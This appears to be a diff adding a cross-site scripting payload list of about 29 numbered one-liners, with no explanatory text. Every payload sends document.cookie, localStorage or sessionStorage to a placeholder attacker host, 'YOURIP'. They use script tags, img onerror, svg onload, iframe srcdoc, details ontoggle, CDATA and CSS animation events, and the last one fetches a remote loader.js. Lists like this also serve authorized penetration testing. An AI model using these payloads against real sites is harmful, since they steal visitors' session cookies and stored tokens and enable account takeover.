@@ -1,0 +1,57 @@
+document.write('<img src="http://YOURIP/?1='+document.cookie+'" />');
+
+<script>new Image().src='http://YOURIP/?2='+document.cookie</script>
+
+<img src=x onerror="new Image().src='http://YOURIP/?3='+document.cookie">
+
+<svg onload="new Image().src='http://YOURIP/?4='+document.cookie">
+
+<iframe srcdoc="<script>new Image().src='http://YOURIP/?5='+document.cookie</script>">
+
+<details open ontoggle="new Image().src='http://YOURIP/?6='+document.cookie">
+
+<math><mi><script>new Image().src='http://YOURIP/?7='+document.cookie</script>
+
+<marquee onstart="new Image().src='http://YOURIP/?8='+document.cookie">
+
+<script>fetch('http://YOURIP/?9='+btoa(JSON.stringify(localStorage)))</script>
+
+<img src=x onerror='fetch("http://YOURIP/?10="+btoa(JSON.stringify(localStorage)))'>
+
+<svg onload='fetch("http://YOURIP/?11="+btoa(JSON.stringify(localStorage)))'>
+
+<script>fetch('http://YOURIP/?12='+btoa(JSON.stringify(sessionStorage)))</script>
+
+<img src=x onerror='fetch("http://YOURIP/?13="+btoa(JSON.stringify(sessionStorage)))'>
+
+<script>fetch("http://YOURIP/?14=" + btoa(document.cookie + ";" + document.location + ";" + document.referrer + ";" + JSON.stringify(localStorage)))</script>
+
+<svg><desc><![CDATA[<script>fetch('http://YOURIP/?15='+document.cookie)</script>]]></desc></svg>
+
+<iframe srcdoc="&lt;script&gt;fetch('http://YOURIP/?16='+document.cookie)&lt;/script&gt;"></iframe>
+
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="fetch('http://YOURIP/?17='+document.cookie)">
+
+fetch('http://YOURIP/?18='+eval('document.cookie'))
+
+<img src='x' onerror='fetch("http://YOURIP/exfil?19=" + document.cookie)'>
+
+<img src='x' onerror='fetch("http://YOURIP/exfil?20=" + JSON.stringify(localStorage))'>
+
+<img src=x onerror="new Image().src='http://YOURIP/?21='+document.cookie">
+
+<script>fetch('http://YOURIP/?22='+document.cookie)</script>
+
+<svg onload="fetch('http://YOURIP/?23='+document.cookie)">
+
+<iframe srcdoc="<script>fetch('http://YOURIP/?24='+document.cookie)</script>"></iframe>
+
+<img src=x onerror="fetch('http://YOURIP/?25='+encodeURIComponent(document.cookie))">
+
+<img src=x onerror="fetch('http://YOURIP/?26='+btoa(document.cookie))">
+
+<img src=x onerror="fetch('http://YOURIP/?27='+btoa(JSON.stringify(localStorage)))">
+
+<img src=x onerror="fetch('http://YOURIP/?28='+btoa(JSON.stringify(sessionStorage)))">
+
+<img src=x onerror="fetch('http://YOURIP/loader.js')">
